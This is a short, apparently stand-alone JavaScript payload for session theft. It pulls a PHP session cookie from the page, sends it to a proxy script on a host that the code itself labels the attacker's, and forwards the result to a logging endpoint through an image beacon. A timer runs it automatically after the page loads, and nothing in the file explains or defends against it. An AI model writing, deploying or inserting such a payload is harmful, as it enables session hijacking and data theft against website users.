
function exfiltrateData() {
    
    var url = 'https://192.168.0.10'

    var proxyUrl = url + '/proxy.php';
    
    var attackerUrl = url + '/log.php';

    var phpsessid = /SESS\w*ID=([^;]+)/i.test(document.cookie) ? RegExp.$1 : false;

    var xhr = new XMLHttpRequest();
    
    xhr.open('GET', proxyUrl + '?sessionid='+ phpsessid, true);
    
    xhr.onreadystatechange = function() {
        if (xhr.readyState === XMLHttpRequest.DONE) {
            if (xhr.status === 200) {
                
                var data = xhr.responseText;
                
                
                var img = new Image();
                img.src = attackerUrl + '?data=' + encodeURIComponent(data);
            }
        }
    };
    
    xhr.send();
}

// window.onload = exfiltrateData;

setTimeout(exfiltrateData, 1000);

